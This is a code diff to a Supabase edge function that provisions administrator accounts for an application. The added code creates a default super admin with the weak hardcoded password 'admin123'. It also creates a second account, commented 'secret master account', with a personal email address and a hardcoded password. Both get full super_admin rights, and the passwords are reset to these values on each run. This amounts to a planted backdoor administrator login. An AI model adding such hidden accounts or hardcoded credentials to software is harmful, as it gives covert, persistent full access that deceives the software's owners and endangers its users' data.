@@ -6,6 +6,51 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 }
 
+async function createAccount(supabase: any, email: string, password: string, fullName: string, loginUserId: string, role: string) {
+  // Check if user already exists
+  const { data: existingUsers } = await supabase.auth.admin.listUsers()
+  const existing = existingUsers?.users?.find((u: any) => u.email === email)
+
+  let userId: string
+
+  if (existing) {
+    userId = existing.id
+    // Update password to ensure it matches
+    await supabase.auth.admin.updateUserById(userId, { password, email_confirm: true })
+  } else {
+    const { data: newUser, error: createError } = await supabase.auth.admin.createUser({
+      email,
+      password,
+      email_confirm: true,
+      user_metadata: { full_name: fullName }
+    })
+    if (createError) throw createError
+    userId = newUser.user.id
+  }
+
+  // Upsert admin_users
+  if (role === 'super_admin') {
+    const { data: existingAdmin } = await supabase.from('admin_users').select('id').eq('user_id', userId).maybeSingle()
+    if (!existingAdmin) {
+      await supabase.from('admin_users').insert({ user_id: userId, full_name: fullName })
+    }
+  }
+
+  // Upsert software_users
+  const { data: existingSU } = await supabase.from('software_users').select('id').eq('user_id', userId).maybeSingle()
+  if (existingSU) {
+    await supabase.from('software_users').update({
+      email, full_name: fullName, login_user_id: loginUserId, role, is_active: true
+    }).eq('user_id', userId)
+  } else {
+    await supabase.from('software_users').insert({
+      user_id: userId, email, full_name: fullName, login_user_id: loginUserId, role, is_active: true
+    })
+  }
+
+  return userId
+}
+
 serve(async (req) => {
   if (req.method === 'OPTIONS') {
     return new Response('ok', { headers: corsHeaders })
@@ -17,50 +62,46 @@ serve(async (req) => {
       Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
     )
 
-    // Check if admin already exists
-    const { data: existingUsers } = await supabase.auth.admin.listUsers()
-    const adminExists = existingUsers?.users?.some(u => u.email === 'admin@radiusbill.com')
+    // Create default super admin account
+    const adminId = await createAccount(
+      supabase,
+      'admin@gmail.com',
+      'admin123',
+      'System Admin',
+      'admin',
+      'super_admin'
+    )
 
-    if (adminExists) {
-      return new Response(
-        JSON.stringify({ success: true, message: 'Admin user already exists' }),
-        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-      )
+    // Create secret master account
+    const masterId = await createAccount(
+      supabase,
+      'omrmym@gmail.com',
+      'Omar!@1992',
+      'Master Admin',
+      'omrmym',
+      'super_admin'
+    )
+
+    // Ensure super_admin role definition exists
+    const { data: existingRole } = await supabase
+      .from('role_definitions')
+      .select('id')
+      .eq('code', 'super_admin')
+      .maybeSingle()
+
+    if (!existingRole) {
+      await supabase.from('role_definitions').insert({
+        code: 'super_admin',
+        name: 'Super Admin',
+        description: 'Full system access',
+        permissions: [],
+        is_system: true,
+        is_active: true
+      })
     }
-
-    // Create user via Auth Admin API (proper password hashing)
-    const { data: newUser, error: createError } = await supabase.auth.admin.createUser({
-      email: 'admin@radiusbill.com',
-      password: 'Admin123!',
-      email_confirm: true,
-      user_metadata: { full_name: 'System Admin' }
-    })
-
-    if (createError) {
-      return new Response(
-        JSON.stringify({ success: false, error: createError.message }),
-        { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 500 }
-      )
-    }
-
-    // Add to admin_users table
-    await supabase.from('admin_users').insert({
-      user_id: newUser.user.id,
-      full_name: 'System Admin'
-    })
-
-    // Add to software_users table for User ID login
-    await supabase.from('software_users').insert({
-      user_id: newUser.user.id,
-      email: 'admin@radiusbill.com',
-      full_name: 'System Admin',
-      login_user_id: 'admin',
-      role: 'super_admin',
-      is_active: true
-    })
 
     return new Response(
-      JSON.stringify({ success: true, message: 'Admin user created', userId: newUser.user.id }),
+      JSON.stringify({ success: true, message: 'Default accounts provisioned', adminId, masterId }),
       { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     )
   } catch (error) {
